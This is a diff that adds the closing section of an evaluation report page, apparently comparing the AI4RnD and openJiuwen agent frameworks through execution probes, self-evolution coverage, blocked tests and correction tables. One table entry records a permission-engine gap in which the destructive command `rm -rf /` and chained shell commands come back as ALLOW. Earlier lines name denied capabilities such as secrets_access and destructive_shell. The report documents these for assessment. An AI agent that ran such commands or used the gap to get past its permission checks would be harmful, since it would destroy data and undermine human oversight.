+<ul><li>promotion target must be under <code>/tmp</code>; production paths rejected;</li><li><code>hard_policy_checker.py</code> freezes core safety policy — candidates may not relax</li></ul>
+<p><code>secrets_access</code>, <code>git_push</code>, <code>destructive_shell</code>, <code>payment_action</code>, <code>external_api_write</code>.</p>
+<p><code>evolution_engine.py</code> also executes (<code>scorecard</code> / <code>recommend</code> / <code>promote</code> / <code>demote-degraded</code> / <code>status</code>) but tracks exactly <strong>one</strong> capability (<code>deepresearch.quality_gate</code>) with 0 terminal nodes and 0 examples.</p>
+<p><strong>Neither is referenced by <code>coordinator.sh</code> or <code>solar-harness.sh</code>.</strong></p>
+<p><strong>RSI coverage across the eight target classes</strong> (word-boundary search):</p>
+<div class="tw"><table><thead><tr><th>RSI target</th><th>Named methods</th><th>Present?</th></tr></thead><tbody><tr><td>1 Text artifacts</td><td>GEPA / MIPROv2 / TextGrad</td><td><strong>GEPA yes (19 files)</strong>; MIPROv2 0; TextGrad 0</td></tr><tr><td>2 Runtime routing</td><td>Bayesian opt / bandits</td><td><strong>0</strong></td></tr><tr><td>3 Capsules &amp; operators</td><td>trajectory mining / CEGIS / Voyager</td><td>partial (<code>skill_to_capsule_compiler</code>); CEGIS 0, Voyager 0</td></tr><tr><td>4 DAG &amp; organisation</td><td>AFlow / MCTS / ADAS</td><td><strong>0</strong></td></tr><tr><td>5 Evaluator &amp; governance</td><td>judge calibration / reward modelling</td><td><strong>0</strong></td></tr><tr><td>6 Memory &amp; evidence</td><td>Self-RAG / reranker training</td><td><strong>0</strong></td></tr><tr><td>7 Model weights</td><td>SFT / LoRA / DPO / GRPO</td><td><strong>0</strong> (matches are persona markdown + a report appendix)</td></tr><tr><td>8 Data &amp; benchmarks</td><td>active learning / hard-case mining</td><td>partial (<code>failure_miner</code>, 109 LOC)</td></tr></tbody></table></div>
+<p><strong>One of eight surfaces is implemented, and it is not connected.</strong></p>
+<hr>
+<h2 id="v-14-openjiuwen-deepsearch-overlap-prior-risk-r5-resolved"><a class="anchor" href="#v-14-openjiuwen-deepsearch-overlap-prior-risk-r5-resolved" aria-hidden="true">#</a>V-14 · openJiuwen-DeepSearch overlap — prior risk R5 resolved ⭐</h2>
+<p>Prior revision flagged this as possibly invalidating the whole integration case.</p>
+<pre><code>scripts/main.py            337 LOC
+grep -c &quot;citation|evidence|claim|provenance&quot; scripts/main.py  -&gt;  0</code></pre>
+<p>The skill is a thin wrapper (<code>run_jiuwen_workflow</code>, <code>execute_deep_search</code>, <code>run_background</code>) around an openjiuwen workflow, producing Markdown/Doc/HTML after ~15 minutes. It has <strong>no</strong> evidence ledger, claim model, citation span, source authority scoring, or gate.</p>
+<p><strong>Conclusion: not a competitor to the intended AI4RnD product.</strong> They are different classes of artifact — a generated report versus an audited evidence bundle. Prior risk R5 is <strong>downgraded from High to Low</strong>. (The converse also holds: DeepSearch is not a starting point for feature 70 either.)</p>
+<hr>
+<h2 id="blocked-tests"><a class="anchor" href="#blocked-tests" aria-hidden="true">#</a>Blocked tests</h2>
+<div class="tw"><table><thead><tr><th>Test</th><th>Why</th></tr></thead><tbody><tr><td>Live model routing / provider selection</td><td>requires provider credentials — safeguard: no paid or authenticated providers</td></tr><tr><td>End-to-end JiuwenSwarm chat with a real agent</td><td>requires a model endpoint</td></tr><tr><td>jiuwenbox sandbox enforcement (bwrap/cgroup)</td><td>requires kernel privileges unavailable in this container</td></tr><tr><td>RailManager hot-reload against a <strong>live</strong> <code>DeepAgent</code></td><td>requires a running agent server with a model backend; V-2 verified the mechanism against a real <code>AbilityManager</code> instead</td></tr><tr><td>Rail survival across agent-cache invalidation and restart</td><td>same dependency; <strong>remains open</strong> — see <a href="10-risks-assumptions-open-questions.html">10</a> Q17</td></tr><tr><td>GEPA <code>run --execute</code></td><td>would spend model budget; only <code>--help</code> and <code>status</code> were run</td></tr><tr><td>AI4RnD tmux dispatch path</td><td>requires tmux + agent CLIs + credentials</td></tr><tr><td>Full AI4RnD suite</td><td>collection aborts (<code>SystemExit</code> at import); subsets run instead</td></tr></tbody></table></div>
+<hr>
+<h2 id="summary-of-corrections-to-the-previous-revision"><a class="anchor" href="#summary-of-corrections-to-the-previous-revision" aria-hidden="true">#</a>Summary of corrections to the previous revision</h2>
+<div class="tw"><table><thead><tr><th>#</th><th>Previous claim</th><th>Corrected finding</th><th>Class</th></tr></thead><tbody><tr><td>1</td><td>Rail seam "Medium-High confidence, not executed"</td><td><strong>Verified by execution</strong> — register + invoke + uninit all work</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>2</td><td>10 rail lifecycle events</td><td><strong>11</strong> — <code>after_react_iteration</code> was undocumented</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>3</td><td>Permission engine has "non-overridable built-in denials" as a strength</td><td><strong>Built-in rules load 0 in a stock install</strong>; <code>rm -rf /</code> returns ALLOW</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>4</td><td>Shell chaining escalates ALLOW→ASK</td><td>Chaining is <strong>decomposed</strong>; net effect ALLOW</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>5</td><td>Per-member permissions assumed feasible</td><td><strong>Only two roles; policy is global</strong> — writer≠verifier not expressible</td><td><span class="chip neutral">SRC</span></td></tr><tr><td>6</td><td>Capsules ≈ skills, dismissed</td><td><strong>Formal 11-section contract</strong>; 30 registered, 23 validated</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>7</td><td>RSI "largely aspirational"</td><td><strong>GEPA is 3,540 LOC with a full promote/rollback lifecycle</strong>, unwired</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>8</td><td>Grounding "precision unknown, spike E8"</td><td><strong>Precision 0.25 / detection 0.14</strong>, measured</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>9</td><td>DeepSearch might invalidate the case (risk R5, High)</td><td><strong>Zero evidence machinery</strong> — risk downgraded to Low</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>10</td><td>AI4RnD maturity judged by reading</td><td><strong>48/48 import, 29/48 wired</strong> — 19 implemented-but-unwired modules found</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>11</td><td>JiuwenSwarm health unknown</td><td><strong>2,816 tests pass, 0 fail</strong></td><td><span class="chip ok">EXEC</span></td></tr><tr><td>12</td><td>AI4RnD test health unknown</td><td><strong>556 pass, 2 root-environment artifacts</strong></td><td><span class="chip ok">EXEC</span></td></tr></tbody></table></div>
+<hr>
+<h1 id="revision-3-jiuwen-execution-mechanism-probes"><a class="anchor" href="#revision-3-jiuwen-execution-mechanism-probes" aria-hidden="true">#</a>Revision 3 — Jiuwen execution-mechanism probes</h1>
+<p>Same environment as V-1…V-14 (<code>.venv-jw</code>, <code>openjiuwen==0.1.15.post3</code>, <code>jiuwenswarm</code> editable).</p>
+<h2 id="v-15-core-workflow-and-the-pregel-engine-exist-and-build"><a class="anchor" href="#v-15-core-workflow-and-the-pregel-engine-exist-and-build" aria-hidden="true">#</a>V-15 · Core Workflow and the Pregel engine exist and build ⭐</h2>
+<pre><code>./.venv-jw/bin/python exp3_workflow.py</code></pre>
+<pre><code>AgentRail/Pregel primitives
+  PregelBuilder methods : [&#x27;add_branch&#x27;, &#x27;add_edge&#x27;, &#x27;add_node&#x27;, &#x27;build&#x27;]
+  Channel contract      : [&#x27;is_ready&#x27;, &#x27;accept&#x27;, &#x27;consume&#x27;, &#x27;snapshot&#x27;, &#x27;restore&#x27;]
+  BarrierMessage exists : True | GraphInterrupt: True
+  PregelLoop members    : [&#x27;_is_resume&#x27;, &#x27;_run_step&#x27;, &#x27;_save_state_on_error&#x27;, &#x27;init&#x27;, &#x27;run_step&#x27;]
+
+Built a fan-out + barrier graph
+  build() signature     : (store=None, after_step_callback=None)
+  built Pregel          : Pregel
+  run() signature       : (config) -&gt; None | dict | dict[str, Interrupt | tuple[Interrupt,...] | None]
+
+Core Workflow API — all present
+  set_start_comp · add_workflow_comp · set_end_comp · add_connection ·
+  add_stream_connection · add_conditional_connection · invoke · stream · draw
+  router type: Callable[..., Hashable | list[Hashable]]        &lt;-- dynamic fan-out
+
+Components
+  flow      [&#x27;branch_comp&#x27;,&#x27;branch_router&#x27;,&#x27;end_comp&#x27;,&#x27;start_comp&#x27;,&#x27;workflow_comp&#x27;]
+  llm       [&#x27;intent_detection_comp&#x27;,&#x27;llm_comp&#x27;,&#x27;questioner_comp&#x27;]
+  tool      [&#x27;tool_comp&#x27;]
+  resource  [&#x27;knowledge_retrieval_comp&#x27;,&#x27;memory_retrieval_comp&#x27;,&#x27;memory_write_comp&#x27;]
+  condition [&#x27;array&#x27;,&#x27;condition&#x27;,&#x27;expression&#x27;,&#x27;number&#x27;]
+
+Checkpointer hooks
+  pre/post_workflow_execute · pre/post_agent_execute · pre/post_agent_team_execute ·
+  interrupt_agent_execute · session_exists · release · graph_store
+Storage contract: save · recover · clear · exists</code></pre>
+<p><strong>Findings.</strong> A Pregel bulk-synchronous engine with channel <code>snapshot</code>/<code>restore</code>, barrier messages, graph interrupts and resume detection sits under Core Workflow. <code>workflow_comp</code> makes workflows nestable. Conditional routers may return a <strong>list</strong>, giving runtime fan-out.</p>
+<p><strong>This is the finding that overturns Revision 2's Stage 3.</strong> See <a href="15-correction-log.html">15-correction-log.md §1</a> and <a href="17-taskgraph-verdict.html">17-taskgraph-verdict.md</a>.</p>
+<h2 id="v-16-swarmflow-script-contract-meta-purity-and-determinism-l"><a class="anchor" href="#v-16-swarmflow-script-contract-meta-purity-and-determinism-l" aria-hidden="true">#</a>V-16 · SwarmFlow script contract — META purity and determinism lint ⭐</h2>
+<pre><code>./.venv-jw/bin/python exp5_swarmflow.py   # then direct calls to loader</code></pre>
+<pre><code>extract_workflow_meta(source, filename) -&gt; dict
+load_workflow_meta(path) -&gt; dict
+load_workflow_source(path) -&gt; LoadedWorkflow
+
+_BANNED_MODULE_CALLS: {&#x27;time&#x27;: {&#x27;time&#x27;,&#x27;monotonic&#x27;,&#x27;perf_counter&#x27;,&#x27;time_ns&#x27;,&#x27;monotonic_ns&#x27;},
+                       &#x27;random&#x27;: None, &#x27;uuid&#x27;: None}
+_BANNED_ATTRS       : {&#x27;now&#x27;,&#x27;today&#x27;,&#x27;utcnow&#x27;}
+_THUNK_CALLEES      : {&#x27;agent&#x27;,&#x27;workflow&#x27;}
+
+sfprobe/good.py                 -&gt; OK {&#x27;name&#x27;:&#x27;evidence-sweep&#x27;,&#x27;description&#x27;:&#x27;demo&#x27;,
+                                       &#x27;phases&#x27;:[&#x27;search&#x27;,&#x27;extract&#x27;]}
+sfprobe/bad_meta.py             -&gt; REJECTED MetaError: `META` must be a pure literal
+                                   (no names/calls/concatenation)</code></pre>
+<p><strong>Findings.</strong> A SwarmFlow workflow is ordinary Python with a pure-literal <code>META</code> and <code>async def run(args)</code>. Purity is enforced by <code>ast.literal_eval</code> — executed and confirmed by rejection. The loader lints determinism hazards because the engine replays from a journal.</p>
+<p>Source-confirmed alongside: <code>Journal</code> (WAL, <code>call_signature</code>, <code>get_cached</code>, <code>hits</code>), <code>SemaphoreAdmission</code> / <code>ConcurrencyGovernor</code>, <code>SwarmflowTool.run_background</code> + <code>resume_id</code>, <code>BackgroundTaskController.pause/resume</code>, <code>_check_abort</code>, <code>WorkflowProgressEvent</code>.</p>
+<p><strong>Exposure:</strong> <code>SWARMFLOW_ENABLED_CONFIG_PATH = ("modes","team","jiuwen_team","enable_swarmflow")</code> — a config flag inside team mode, with phases projected to <code>team.task</code> / <code>team.member</code> (<code>team_helpers.py:2159-2288</code>). Users never select SwarmFlow.</p>
+<h2 id="v-17-openjiuwen-has-a-self-evolution-framework"><a class="anchor" href="#v-17-openjiuwen-has-a-self-evolution-framework" aria-hidden="true">#</a>V-17 · openjiuwen has a self-evolution framework ⭐</h2>
+<pre><code>./.venv-jw/bin/python exp4_evolving.py</code></pre>
+<pre><code>Operator (core/operator/base.py)
+  docstring       : &quot;Base class for self-evolution parameter handles.&quot;
+  explicitly      : &quot;Operator is NOT an executable unit.&quot;
+  abstract methods: [&#x27;get_state&#x27;,&#x27;get_tunables&#x27;,&#x27;load_state&#x27;,&#x27;operator_id&#x27;,&#x27;set_parameter&#x27;]
+  TunableSpec     : (&#x27;name&#x27;,&#x27;kind&#x27;,&#x27;path&#x27;,&#x27;constraint&#x27;)
+  kinds shipped   : llm_call · memory_call · skill_call · tool_call
+
+Evaluation
+  Case            : [&#x27;inputs&#x27;,&#x27;label&#x27;,&#x27;tools&#x27;,&#x27;case_id&#x27;]
+  EvaluatedCase   : [&#x27;case&#x27;,&#x27;answer&#x27;,&#x27;score&#x27;,&#x27;reason&#x27;,&#x27;per_metric&#x27;]
+  metrics         : [&#x27;exact_match&#x27;,&#x27;llm_as_judge&#x27;,&#x27;base&#x27;]
+
+Trainer
+  train(agent, train_cases, val_cases, ...)
+  _select_best_candidate_on_val(agent, operators, candidates, val_cases)
+  _snapshot_operators_state / _restore_operators_state
+  _save_checkpoint_if_needed(improved=) / _resume_if_needed
+  apply_updates(operators, updates) / evaluate -&gt; (score, [EvaluatedCase])
+
+Updater  : bind · process · update · requires_forward_data · get_state · load_state
+           impls: single_dim, multi_dim          &lt;-- credit assignment
+Signals  : from_eval · from_conv · team
+agent_rl : offline/ online/{gateway,inference,judge,launcher,rail,scheduler}
+           rl_trainer/{ppo_step, verl_converter, verl_executor} · reward.py
+Checkpointing: EvolutionStore(append_record, archive_evolutions, archive_skill_body,
+               create_skill, ensure_skill_id, ...) · skill_package(pack/unpack/install)
+Sharing  : hub_client · experience_sharer · share_stager</code></pre>
+<p><strong>Findings.</strong> Candidate generation, validation-set selection, snapshot/rollback, freeze markers, credit assignment, evaluation datasets, LLM-judge metrics and PPO-based RL all exist.</p>
+<p><strong>Revision 2 declared six of eight RSI surfaces "absent from both systems" after searching only AI4RnD.</strong> Corrected: one of eight is absent (RSI-4, DAG/agent-organisation search). See <a href="15-correction-log.html">15 §2</a> and <a href="18-evolution-governance.html">18-evolution-governance.md</a>.</p>
+<h2 id="v-18-the-operator-naming-collision"><a class="anchor" href="#v-18-the-operator-naming-collision" aria-hidden="true">#</a>V-18 · The "Operator" naming collision</h2>
+<div class="tw"><table><thead><tr><th></th><th>openjiuwen <code>Operator</code></th><th>AI4RnD "operator"</th></tr></thead><tbody><tr><td>Definition</td><td>tunable-parameter handle for self-evolution</td><td>executable work unit / worker</td></tr><tr><td>Source</td><td><em>"Operator is NOT an executable unit. Execution is handled by the consumer (Agent)"</em></td><td><code>logical-operators.json</code>, <code>physical-operators.json</code></td></tr><tr><td>Interface</td><td><code>get_tunables</code>, <code>set_parameter</code>, <code>get_state</code>, <code>load_state</code>, <code>operator_id</code></td><td><code>required_capabilities</code>, dispatch, quota, health</td></tr></tbody></table></div>
+<p><strong>EXEC.</strong> Resolution adopted: AI4RnD's executable units are renamed <strong>Step</strong> (logical) and <strong>Runner</strong> (physical); "Operator" is reserved for openjiuwen's meaning.</p>
+<h2 id="v-19-mechanism-comparison-consolidated"><a class="anchor" href="#v-19-mechanism-comparison-consolidated" aria-hidden="true">#</a>V-19 · Mechanism comparison, consolidated</h2>
+<p>Full table: <a href="16-jiuwen-execution-mechanisms.html#10-comparison-table">16 §10</a>. The three rows where every Jiuwen mechanism scores ✗ and AI4RnD scores ✅:</p>
+<ul><li>typed contracts / evidence requirements on nodes</li><li>capability routing with honest stall</li><li>write-scope conflict exclusion</li></ul>
+<p>These are the entire justification for AI4RnD-owned runtime code — about <strong>450 LOC</strong>, against the ~5,200 LOC Revision 2 planned to port.</p>
+<hr>
+<h2 id="revision-3-corrections-table"><a class="anchor" href="#revision-3-corrections-table" aria-hidden="true">#</a>Revision 3 corrections table</h2>
+<div class="tw"><table><thead><tr><th>#</th><th>Revision 2 claim</th><th>Corrected finding</th><th>Class</th></tr></thead><tbody><tr><td>13</td><td>AI4RnD must port <code>graph_scheduler</code> (4,189 LOC)</td><td>Pregel + Core Workflow + SwarmFlow provide ~85% of it</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>14</td><td>Durable queue + leases are "a real gap in JiuwenSwarm"; port <code>actor_*</code></td><td><code>ConcurrencyGovernor</code>, <code>SemaphoreAdmission</code>, <code>Journal</code>, <code>BackgroundTaskController</code> already provide it</td><td>EXEC/SRC</td></tr><tr><td>15</td><td>RSI surfaces 2,4,5,6,7,8 absent from both systems</td><td>only RSI-4 is absent; <code>agent_evolving</code> covers the rest</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>16</td><td>RSI needs ~16 weeks of construction</td><td>~6–8 weeks, mostly binding + approval surface</td><td>derived</td></tr><tr><td>17</td><td>"Operator" had three colliding meanings (all inside AI4RnD)</td><td>four — openjiuwen adds one with the opposite sense</td><td><span class="chip ok">EXEC</span></td></tr><tr><td>18</td><td>JiuwenSwarm covers 20/142 features fully</td><td><strong>23/142 FULL</strong>, NONE 72→62, after the mechanism inventory</td><td>derived</td></tr><tr><td>19</td><td>Recommended a separate service with its own scheduler</td><td>in-process project subsystem compiling to Jiuwen mechanisms</td><td>derived</td></tr></tbody></table></div>
+<h2 id="blocked-in-revision-3"><a class="anchor" href="#blocked-in-revision-3" aria-hidden="true">#</a>Blocked in Revision 3</h2>
+<div class="tw"><table><thead><tr><th>Test</th><th>Why</th></tr></thead><tbody><tr><td>End-to-end Core Workflow <code>invoke()</code> with a live model</td><td>needs provider credentials</td></tr><tr><td>SwarmFlow <code>run()</code> with real agents</td><td>needs a team runtime + credentials</td></tr><tr><td>Checkpointer persistence across a real restart</td><td>needs a configured KV backend — <strong>Q24</strong></td></tr><tr><td><code>Trainer.train</code> on real cases</td><td>needs credentials and a golden set</td></tr><tr><td>Write-scope admission prototype</td><td>design work, not yet built</td></tr></tbody></table></div></article><div class="pager"><a href="06-integration-challenges.html"><div class="d">← Previous</div><div class="t">Integration challenges</div></a><a class="nx" href="11-evidence-appendix.html"><div class="d">Next →</div><div class="t">Evidence appendix</div></a></div></main>
+</div>
+<button class="tt" id="tt" aria-label="Toggle colour theme">&#9689;</button>
+<script src="vendor/mermaid.min.js"></script>
+<script>
+(function(){
+  var KEY='ai4rnd-theme', r=document.documentElement;
+  var saved=localStorage.getItem(KEY); if(saved) r.setAttribute('data-theme',saved);
+  function dark(){ var a=r.getAttribute('data-theme');
+    return a? a==='dark' : matchMedia('(prefers-color-scheme:dark)').matches; }
+  document.getElementById('tt').onclick=function(){
+    var next = dark()?'light':'dark';
+    r.setAttribute('data-theme',next); localStorage.setItem(KEY,next);
+    location.reload();
+  };
+
+  var FONT='"Schibsted Grotesk",-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif';
+  var LIGHT={background:'#ffffff',mainBkg:'#fafafb',primaryColor:'#fafafb',
+    primaryTextColor:'#1a1b1d',primaryBorderColor:'#d3d4d9',secondaryColor:'#f4f4f6',
+    secondaryTextColor:'#1a1b1d',secondaryBorderColor:'#d3d4d9',tertiaryColor:'#ffffff',
+    tertiaryTextColor:'#1a1b1d',tertiaryBorderColor:'#e6e6ea',
+    nodeBorder:'#d3d4d9',clusterBkg:'#ffffff',clusterBorder:'#e6e6ea',
+    lineColor:'#8b8d94',textColor:'#1a1b1d',titleColor:'#a60822',
+    edgeLabelBackground:'#ffffff',labelBackground:'#ffffff',
+    noteBkgColor:'#f4f4f6',noteTextColor:'#54565c',noteBorderColor:'#e6e6ea',
+    actorBkg:'#fafafb',actorBorder:'#d3d4d9',actorTextColor:'#1a1b1d',
+    signalColor:'#54565c',signalTextColor:'#1a1b1d',
+    labelBoxBkgColor:'#f4f4f6',labelBoxBorderColor:'#d3d4d9',labelTextColor:'#1a1b1d',
+    loopTextColor:'#54565c',altBackground:'#fafafb',
+    sectionBkgColor:'#f4f4f6',sectionBkgColor2:'#fafafb',altSectionBkgColor:'#ffffff',
+    taskBkgColor:'#f4f4f6',taskBorderColor:'#d3d4d9',taskTextColor:'#1a1b1d',
+    taskTextDarkColor:'#1a1b1d',taskTextOutsideColor:'#54565c',
+    activeTaskBkgColor:'#cf0a2c',activeTaskBorderColor:'#a60822',
+    doneTaskBkgColor:'#e6e6ea',doneTaskBorderColor:'#d3d4d9',
+    critBkgColor:'#fbefd0',critBorderColor:'#b26a00',
+    gridColor:'#e6e6ea',todayLineColor:'#cf0a2c',
+    transitionColor:'#8b8d94',stateBkg:'#fafafb',stateBorder:'#d3d4d9'};
+  var DARK={background:'#131316',mainBkg:'#191a1d',primaryColor:'#191a1d',
+    primaryTextColor:'#e8e8ea',primaryBorderColor:'#3a3b40',secondaryColor:'#1f2024',
+    secondaryTextColor:'#e8e8ea',secondaryBorderColor:'#3a3b40',tertiaryColor:'#131316',
+    tertiaryTextColor:'#e8e8ea',tertiaryBorderColor:'#2a2b30',
+    nodeBorder:'#3a3b40',clusterBkg:'#131316',clusterBorder:'#2a2b30',
+    lineColor:'#8b8d94',textColor:'#e8e8ea',titleColor:'#ff8397',
+    edgeLabelBackground:'#131316',labelBackground:'#131316',
+    noteBkgColor:'#1f2024',noteTextColor:'#a4a6ac',noteBorderColor:'#2a2b30',
+    actorBkg:'#191a1d',actorBorder:'#3a3b40',actorTextColor:'#e8e8ea',
+    signalColor:'#a4a6ac',signalTextColor:'#e8e8ea',
+    labelBoxBkgColor:'#1f2024',labelBoxBorderColor:'#3a3b40',labelTextColor:'#e8e8ea',
+    loopTextColor:'#a4a6ac',altBackground:'#191a1d',
+    sectionBkgColor:'#1f2024',sectionBkgColor2:'#191a1d',altSectionBkgColor:'#131316',
+    taskBkgColor:'#1f2024',taskBorderColor:'#3a3b40',taskTextColor:'#e8e8ea',
+    taskTextDarkColor:'#e8e8ea',taskTextOutsideColor:'#a4a6ac',
+    activeTaskBkgColor:'#ff5d74',activeTaskBorderColor:'#ff8397',
+    doneTaskBkgColor:'#2a2b30',doneTaskBorderColor:'#3a3b40',
+    critBkgColor:'#3a2e18',critBorderColor:'#e0a355',
+    gridColor:'#2a2b30',todayLineColor:'#ff5d74',
+    transitionColor:'#8b8d94',stateBkg:'#191a1d',stateBorder:'#3a3b40'};
+  if(window.mermaid){
+    var v = dark()? DARK : LIGHT; v.fontFamily = FONT; v.fontSize = '13px';
+    mermaid.initialize({startOnLoad:true, securityLevel:'loose', theme:'base',
+      themeVariables:v, flowchart:{curve:'basis',useMaxWidth:false,htmlLabels:true},
+      sequence:{useMaxWidth:false}, gantt:{useMaxWidth:false}});
+  } else {
+    document.querySelectorAll('pre.mermaid').forEach(function(el){
+      el.classList.add('raw');
+      var n=document.createElement('div'); n.className='fignote';
+      n.textContent='Diagram source (renderer unavailable offline)';
+      el.parentNode.insertBefore(n, el);
+    });
+  }
+})();
+</script></body></html>
